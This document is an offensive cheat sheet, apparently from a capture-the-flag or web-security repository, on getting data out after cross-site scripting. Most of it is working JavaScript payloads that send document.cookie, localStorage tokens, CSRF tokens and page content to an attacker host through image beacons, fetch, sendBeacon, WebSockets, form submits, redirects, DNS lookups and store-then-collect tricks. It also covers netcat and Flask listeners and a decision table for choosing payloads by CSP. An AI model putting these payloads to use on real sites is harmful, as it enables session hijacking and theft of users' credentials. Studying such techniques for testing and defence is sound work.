# Exfiltration — getting the data out once JS runs

XSS gives you JS in the target's origin. The next question: how
does the captured data (cookie, token, DOM content, CSRF token,
flag) reach you? Every method here is a channel — pick by what CSP
allows and what you control.

---

## 1. The targets — what to steal

```javascript
document.cookie                          -- session cookies
localStorage.getItem('token')            -- JWT/session in storage
sessionStorage.x                          -- per-tab tokens
document.querySelector('meta[name=csrf-token]').content
document.getElementById('flag').textContent  -- flag in the DOM
document.body.innerText                  -- whole page content
fetch('/api/flag').then(r=>r.text())     -- same-origin API call
```

Cookies with `HttpOnly` are INVISIBLE to document.cookie — steal
the flag/content instead, or make the browser itself send the
request (`exfil` via same-origin API on the victim's behalf).

---

## 2. The beacon channels — one-way outbound

```javascript
// img beacon — survives most CSP (img-src usually open):
new Image().src='//me/?c='+encodeURIComponent(document.cookie);
document.createElement('img').src='//me/?c='+document.cookie;

// fetch/XHR — needs connect-src to allow your host:
fetch('//me/?c='+document.cookie);
fetch('//me/',{method:'POST',body:document.cookie});
new XMLHttpRequest().open('GET','//me/?c='+document.cookie);

// sendBeacon — fire-and-forget, no response needed:
navigator.sendBeacon('//me/',document.cookie);

// WebSocket — connect-src must allow ws:
new WebSocket('wss://me/').onopen=function(){
  this.send(document.cookie)};

// EventSource is inbound-only — dead end for exfil

// CSS exfil — no JS at all:
// <style>input[value^=a]{background:url(//me/a)}</style>

// form submit — navigates the page:
var f=document.createElement('form');
f.action='//me/';f.method='POST';
f.innerHTML='<input name=c value="'+document.cookie+'">';
document.body.append(f);f.submit();

// location redirect — the page leaves:
location='//me/?c='+document.cookie;
location.href='//me/?c='+encodeURIComponent(document.cookie);
window.open('//me/?c='+document.cookie);   -- popup (may be blocked)

// DNS exfil — only the hostname leaks (for CSP-tight pages):
new Image().src='//'+btoa(document.cookie)+'.me/';
   -- the cookie goes out in the DNS QUERY — no HTTP needed
   -- CSP allows the img-src check to pass (host matches via dns)
```

---

## 3. CSP-gated channel selection

```text
connect-src 'self'          → only same-origin fetch/XHR/beacon
img-src 'self' data:        → img only to self+data:
default-src 'self'          → everything same-origin
connect-src *               → fetch anywhere
no CSP                      → anything works
```

Same-origin-only → the app itself must carry the data (§6).
`connect-src *` or host-listed → direct exfil.

---

## 4. Your own listener — the receiving side

```bash
# netcat — quick and dirty, one request:
nc -lkp 8000

# python http.server — better, logs headers:
python3 -m http.server 8000

# flask — logged, parsable:
python3 -c "from flask import Flask,request;a=Flask(__name__);
 a.route('/')(lambda:print(request.args)or'ok');a.run(host='0.0.0.0')"

# the repo's OOB listener — requestbin-style:
python3 tools/web/oob_listener.py --port 8000
```

For real contests: `requestbin`, `interactsh`, `burp collaborator`,
or a small VPS endpoint. The repo has `tools/web/oob_listener.py`.

---

## 5. Same-origin-only CSP — the app carries the data

`connect-src 'self'` blocks outbound — use the app's own endpoints:

```javascript
// write the cookie INTO an app field, then read it back:
fetch('/api/profile',{method:'POST',headers:{'Content-Type':
  'application/json'},body:JSON.stringify({bio:document.cookie})})
.then(()=>fetch('/api/profile'))
.then(r=>r.text()).then(t=>location='//me/?d='+btoa(t));

// a comment/post endpoint — write then fetch your own listing:
fetch('/api/comment',{method:'POST',body:'c='+document.cookie})
.then(()=>fetch('/api/comments'))
.then(r=>r.text()).then(t=>fetch('//me/?d='+encodeURIComponent(t)));
   -- the last fetch needs connect-src to allow //me — if not:
   -- write it to a place YOU control in the app (own profile) and
      read it via your OWN session later — no outbound needed

// the two-stage approach — store-then-collect:
// stage 1 (XSS): post the cookie into a comment you can read
fetch('/api/notes',{method:'POST',body:JSON.stringify(
  {note:document.cookie}),headers:{'Content-Type':'application/json'}});
// stage 2 (your session): GET /api/notes and read the victim's
//   cookie from the note — only works if notes are shared/visible
```

When NOTHING leaves the origin: store the loot in the app itself,
then collect it through your own account. The victim's browser does
the writing; you read it later with your own session.

---

## 6. The DOM-as-channel — read what the page already shows

Sometimes the "exfil" is just reading the DOM the bot sees:

```javascript
// the admin's flag is already on the page they visit:
var flag = document.querySelector('.flag').textContent;
   -- write it back into YOUR profile/comment/anything you own
document.querySelector('input[name=bio]').value = flag;
document.querySelector('form').submit();
   -- the XSS itself submits the data to YOUR account — no outbound
```

This is the standard admin-bot pattern: bot visits your page →
your JS reads the flag from THEIR DOM → writes it into a resource
YOU can read (a comment you control, your own profile field).

---

## 7. window.name and localStorage carriers — cross-page channels

```javascript
// the payload sets window.name — survives navigation:
name = document.cookie; location = '//me/';
   -- the next page (yours) reads window.name

// localStorage — same origin required for readback:
localStorage.loot = document.cookie;
   -- you read it on a different page of the same origin later
```

---

## 8. postMessage exfil — when you embedded the target

```javascript
// your page iframes the target — target's XSS posts back:
parent.postMessage(document.cookie, '*');
   -- your page listens: window.addEventListener('message', e=>...)
```

---

## 9. The token-specific paths — JWT/session in storage

```javascript
localStorage.token                    -- JWT in storage
localStorage.getItem('auth')          -- common key names
sessionStorage.token
JSON.parse(localStorage.user).token   -- nested
document.cookie.match(/session=([^;]+)/)[1]  -- specific cookie
document.querySelector('[name=csrf]').value   -- CSRF token
```

HttpOnly cookies: unreadable — instead perform ACTIONS as the
victim (`fetch('/api/flag')` with their session auto-attached).

---

## 10. The "no outbound at all" endgame

CSP `default-src 'none'`, no allowed channels — the last channels:

```javascript
// 1. the page's own form — hijack it:
document.forms[0].action = '/api/notes';
   -- submit flag-bearing data to your own note

// 2. window.name carrier + manual navigation
name = document.body.innerText; location = '/your-profile';
   -- then your next visit reads... no — name doesn't survive
      same-origin nav to another user
   -- instead: the app-as-channel (§5) is the answer

// 3. DNS — if img-src allows any host, the DNS query itself leaks:
new Image().src='//'+btoa(flag).replace(/=/g,'')+'.x.me/';
   -- hostnames allow [a-z0-9-] — btoa has +/= → strip +/-
   -- or hex-encode: [...flag].map(c=>c.charCodeAt(0).toString(16)).join('')
```

---

## 11. Encoding the payload for transport

```javascript
encodeURIComponent(document.cookie)     -- URL-safe
btoa(document.cookie)                    -- base64 (watch +/= in URLs)
btoa(document.cookie).replace(/[=+/]/g,c=>({'=':'','+':'-','/':'_'}[c]))
                                         -- urlsafe base64
[...document.cookie].map(c=>c.charCodeAt(0).toString(16)).join('')
                                         -- hex (long but clean)
document.cookie.split(';').map(encodeURIComponent).join('|')
```

---

## 12. The decision table

| Situation | Channel |
|---|---|
| no CSP | `fetch('//me/?c='+document.cookie)` |
| img-src open | `new Image().src='//me/?c='+…` |
| connect-src open | `fetch`/`sendBeacon`/WebSocket |
| self-only | write into app resource you can read |
| nothing outbound | DOM-write to your own profile field |
| only DNS reachable | `img.src` with btoa-hostname |
| need the flag not the cookie | `fetch('/api/flag')` same-origin |
| bot in iframe | `parent.postMessage(flag,'*')` |
